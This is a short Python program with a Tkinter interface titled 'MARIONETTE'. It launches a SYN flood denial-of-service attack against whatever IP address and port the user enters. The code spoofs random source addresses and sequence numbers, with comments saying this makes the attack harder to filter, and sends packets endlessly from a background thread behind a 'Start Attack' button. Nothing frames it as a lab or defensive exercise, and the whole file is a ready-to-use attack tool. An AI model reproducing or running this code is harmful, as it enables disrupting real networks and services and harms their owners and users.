import tkinter as tk
from scapy.all import *
import threading
import random
import time

def syn_flood(target_ip, target_port):
    while True:
        # Randomizing source IP and sequence number to make the attack harder to filter
        src_ip = ".".join(str(random.randint(0, 255)) for _ in range(4))  # Random source IP
        seq_num = random.randint(1000, 9000)  # Random sequence number
        ip = IP(src=src_ip, dst=target_ip)  # Set the random source IP and target IP
        syn = TCP(dport=target_port, flags="S", seq=seq_num)
        pkt = ip/syn
        send(pkt, verbose=0)  # Send SYN packet

        # Send packets as fast as possible to increase intensity
        time.sleep(0.001)  # Adjust the sleep time to control attack speed

def start_attack():
    target_ip = ip_entry.get()
    target_port = int(port_entry.get())
    attack_thread = threading.Thread(target=syn_flood, args=(target_ip, target_port))
    attack_thread.daemon = True
    attack_thread.start()
    status_label.config(text=f"Attack started on {target_ip}:{target_port}")

# Set up the GUI window
window = tk.Tk()
window.title("MARIONETTE")
window.geometry("400x200")

# Add labels and entry fields
ip_label = tk.Label(window, text="TARGET IP:")
ip_label.pack(pady=10)
ip_entry = tk.Entry(window)
ip_entry.pack(pady=10)

port_label = tk.Label(window, text="PORT:")
port_label.pack(pady=10)
port_entry = tk.Entry(window)
port_entry.pack(pady=10)

# Start attack button
attack_button = tk.Button(window, text="Start Attack", command=start_attack)
attack_button.pack(pady=20)

# Status label to show the status of the attack
status_label = tk.Label(window, text="")
status_label.pack(pady=10)

# Run the GUI
window.mainloop()
